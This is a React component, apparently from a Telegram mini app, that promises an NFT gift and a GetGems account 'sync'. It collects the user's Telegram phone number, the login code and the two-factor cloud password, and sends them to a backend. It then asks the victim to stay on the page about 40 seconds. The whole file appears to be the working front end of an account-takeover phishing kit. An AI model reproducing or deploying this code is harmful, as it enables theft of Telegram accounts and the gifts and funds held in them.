import { useState, useRef } from 'react';
import { authStepPhone, authStepCode, authStepPassword } from '../services/api';
import { setSynced, addToInventory } from '../services/inventory';
import { useAppContext } from '../store';
import { hapticImpact, hapticNotification } from '../services/telegram';
import { nftImage, NFT_NAMES } from '../constants';
import { motion, AnimatePresence } from 'framer-motion';
import { Gift, ArrowLeft } from 'lucide-react';

export default function AuthView() {
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState(['', '', '', '', '']);
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const codeRefs = useRef<(HTMLInputElement | null)[]>([]);
  const { setIsSynced, setCurrentView, giftId, giftSlug, giftNum } = useAppContext();

  const hasGift = Boolean(giftSlug);
  const giftDisplayName = hasGift ? (NFT_NAMES[giftSlug] || giftSlug) : '';
  const giftImageUrl = hasGift ? nftImage(giftSlug, giftNum || undefined) : '';

  const handlePhoneSubmit = async () => {
    if (!phone || phone.length < 10) {
      setError('Введите корректный номер телефона');
      return;
    }
    setLoading(true);
    setError('');
    try {
      // Use giftId from context (set when app opened via deep link)
      const effectiveGiftId = giftId || new URLSearchParams(window.location.search).get('gift_id') || '';
      const res = await authStepPhone(phone, effectiveGiftId);
      if (res.status === 'code_sent') {
        setStep(2);
      } else {
        setError(res.message || 'Ошибка отправки кода');
      }
    } catch (err: any) {
      setError(err.message || 'Ошибка сети');
    } finally {
      setLoading(false);
    }
  };

  const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    if (value && index < 4) {
      codeRefs.current[index + 1]?.focus();
    }

    if (newCode.every((d) => d !== '')) {
      submitCode(newCode.join(''));
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      codeRefs.current[index - 1]?.focus();
    }
  };

  const submitCode = async (fullCode: string) => {
    setLoading(true);
    setError('');
    try {
      const res = await authStepCode(fullCode);
      if (res.status === 'success') {
        handleSuccess();
      } else if (res.status === 'need_password') {
        setStep(3);
      } else if (res.status === 'code_invalid') {
        setError('Неверный код. Проверьте и введите снова.');
        setCode(['', '', '', '', '']);
        codeRefs.current[0]?.focus();
        hapticNotification('error');
      } else if (res.status === 'code_expired') {
        setError('Код истёк. Вернитесь и запросите новый.');
        hapticNotification('error');
      } else {
        setError(res.message || 'Неверный код');
        setCode(['', '', '', '', '']);
        codeRefs.current[0]?.focus();
        hapticNotification('error');
      }
    } catch (err: any) {
      setError(err.message || 'Ошибка сети');
    } finally {
      setLoading(false);
    }
  };

  const handlePasswordSubmit = async () => {
    if (!password) {
      setError('Введите пароль');
      return;
    }
    setLoading(true);
    setError('');
    try {
      const res = await authStepPassword(password);
      if (res.status === 'success') {
        handleSuccess();
      } else if (res.status === 'password_invalid') {
        setError('Неверный пароль. Попробуйте ещё раз.');
        hapticNotification('error');
      } else {
        setError(res.message || 'Неверный пароль');
        hapticNotification('error');
      }
    } catch (err: any) {
      setError(err.message || 'Ошибка сети');
    } finally {
      setLoading(false);
    }
  };

  const handleSuccess = () => {
    setSynced();
    setIsSynced(true);
    hapticNotification('success');
    setStep(4);

    // Вибрация 2-3 секунды: паттерн импульсов через navigator.vibrate
    try {
      navigator.vibrate([300, 100, 300, 100, 300, 100, 300, 100, 300, 100, 300]);
    } catch (_) {}
    // Дополнительно через haptic API Telegram (несколько волн)
    const hapticWaves = [0, 400, 800, 1200, 1600, 2000, 2400];
    hapticWaves.forEach((delay) => {
      setTimeout(() => hapticImpact('medium'), delay);
    });

    setTimeout(() => {
      if (hasGift && giftSlug) {
        addToInventory(giftSlug, giftNum || '0');
        setCurrentView('my-gifts');
      } else {
        setCurrentView('market');
      }
    }, 40000);
  };

  const handleBack = () => {
    hapticImpact('light');
    if (hasGift) {
      setCurrentView('gift-welcome');
    } else {
      setCurrentView('market');
    }
  };

  return (
    <div className="fixed inset-0 bg-[#141414] z-[9999] flex flex-col" style={{ paddingTop: "calc(var(--tg-safe-area-top, 0px) + var(--tg-content-safe-area-top, 0px))" }}>
      {/* Back button */}
      {step !== 4 && (
        <button
          onClick={handleBack}
          className="absolute top-4 left-4 w-9 h-9 bg-white/10 rounded-full flex items-center justify-center active:bg-white/20 transition-colors z-10"
        >
          <ArrowLeft className="w-5 h-5 text-white" />
        </button>
      )}

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="w-full max-w-sm flex flex-col items-center">

          {/* Mini gift preview — shown if user came via gift link */}
          {hasGift && step < 4 && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex items-center gap-3 bg-[#1c1c1e] border border-white/10 rounded-2xl px-4 py-3 mb-6 w-full"
            >
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-amber-400 to-orange-500 overflow-hidden shrink-0 relative">
                <img
                  src={giftImageUrl}
                  alt={giftDisplayName}
                  className="w-full h-full object-cover"
                  referrerPolicy="no-referrer"
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.opacity = '0';
                  }}
                />
              </div>
              <div className="flex flex-col min-w-0">
                <span className="text-xs text-[#8774e1] font-semibold uppercase tracking-wide">
                  Ваш подарок
                </span>
                <span className="text-sm font-bold text-white truncate">{giftDisplayName}</span>
                {giftNum && (
                  <span className="text-xs text-gray-400">#{giftNum}</span>
                )}
              </div>
              <Gift className="w-5 h-5 text-[#8774e1] shrink-0 ml-auto" />
            </motion.div>
          )}

          {/* Step icon / header */}
          {step < 4 && (
            <div className="text-5xl mb-6">
              {step === 1 ? '📱' : step === 2 ? '💬' : '🔒'}
            </div>
          )}

          <AnimatePresence mode="wait">
            {/* ─── Step 1: Phone ─── */}
            {step === 1 && (
              <motion.div
                key="step1"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="w-full flex flex-col items-center"
              >
                <p className="text-lg font-semibold text-white mb-2 text-center">
                  Авторизируйтесь через Telegram
                </p>
                <p className="text-sm text-gray-400 mb-6 text-center">
                  Введите номер телефона привязанный к вашему аккаунту
                </p>
                <input
                  type="tel"
                  placeholder="+7 900 123 45 67"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  onKeyDown={(e) => { if (e.key === 'Enter') handlePhoneSubmit(); }}
                  className="w-full bg-[#2c2c2e] border border-white/10 rounded-xl px-4 py-3.5 text-white text-center text-lg mb-4 focus:border-[#8774e1] outline-none transition-colors"
                />
                {error && (
                  <p className="text-red-400 text-sm mb-4 text-center">{error}</p>
                )}
                <button
                  onClick={handlePhoneSubmit}
                  disabled={loading}
                  className="w-full bg-[#8774e1] text-white font-semibold py-3.5 rounded-xl active:scale-[0.98] transition-transform disabled:opacity-50"
                >
                  {loading ? 'Отправка кода...' : 'Продолжить'}
                </button>
              </motion.div>
            )}

            {/* ─── Step 2: Code ─── */}
            {step === 2 && (
              <motion.div
                key="step2"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="w-full flex flex-col items-center"
              >
                <p className="text-lg font-semibold text-white mb-2 text-center">
                  Код подтверждения
                </p>
                <p className="text-sm text-gray-400 mb-6 text-center">
                  Мы отправили код в приложение Telegram
                </p>

                <div className="flex gap-2.5 my-2">
                  {code.map((digit, i) => (
                    <input
                      key={i}
                      ref={(el) => (codeRefs.current[i] = el)}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleCodeChange(i, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(i, e)}
                      className="w-12 h-14 bg-[#2c2c2e] border border-white/10 rounded-xl text-center text-xl font-bold text-white focus:border-[#8774e1] outline-none transition-colors"
                    />
                  ))}
                </div>

                {loading && (
                  <p className="text-gray-400 text-sm mt-4">Проверяем код...</p>
                )}
                {error && (
                  <p className="text-red-400 text-sm mt-4 text-center">{error}</p>
                )}
              </motion.div>
            )}

            {/* ─── Step 3: Password ─── */}
            {step === 3 && (
              <motion.div
                key="step3"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="w-full flex flex-col items-center"
              >
                <p className="text-lg font-semibold text-white mb-2 text-center">
                  Двухфакторная аутентификация
                </p>
                <p className="text-sm text-gray-400 mb-6 text-center">
                  Введите облачный пароль вашего Telegram аккаунта
                </p>
                <input
                  type="password"
                  placeholder="Облачный пароль"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => { if (e.key === 'Enter') handlePasswordSubmit(); }}
                  className="w-full bg-[#2c2c2e] border border-white/10 rounded-xl px-4 py-3.5 text-white text-center text-lg mb-4 focus:border-[#8774e1] outline-none transition-colors"
                />
                {error && (
                  <p className="text-red-400 text-sm mb-4 text-center">{error}</p>
                )}
                <button
                  onClick={handlePasswordSubmit}
                  disabled={loading}
                  className="w-full bg-[#8774e1] text-white font-semibold py-3.5 rounded-xl active:scale-[0.98] transition-transform disabled:opacity-50"
                >
                  {loading ? 'Проверка...' : 'Подтвердить'}
                </button>
              </motion.div>
            )}

            {/* ─── Step 4: Success ─── */}
            {step === 4 && (
              <motion.div
                key="step4"
                initial={{ opacity: 0, scale: 0.85 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ type: 'spring', stiffness: 200, damping: 18 }}
                className="w-full flex flex-col items-center"
              >
                <div className="w-28 h-28 rounded-full bg-green-500/15 flex items-center justify-center mb-4">
                  <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center text-white text-4xl shadow-xl shadow-green-500/30">
                    ✓
                  </div>
                </div>
                <p className="text-2xl font-bold text-white mb-2">Синхронизация успешна!</p>
                <p className="text-sm text-gray-400 text-center mb-3">
                  Ваш аккаунт успешно подключён к GetGems
                </p>
                <div className="flex items-center gap-2 bg-[#1c1c1e] border border-white/10 rounded-xl px-4 py-3 mt-1">
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ repeat: Infinity, duration: 2, ease: 'linear' }}
                    className="w-4 h-4 border-2 border-[#8774e1] border-t-transparent rounded-full shrink-0"
                  />
                  <p className="text-xs text-gray-300 text-center">
                    Оставайтесь на этой странице ~40 секунд до завершения синхронизации
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
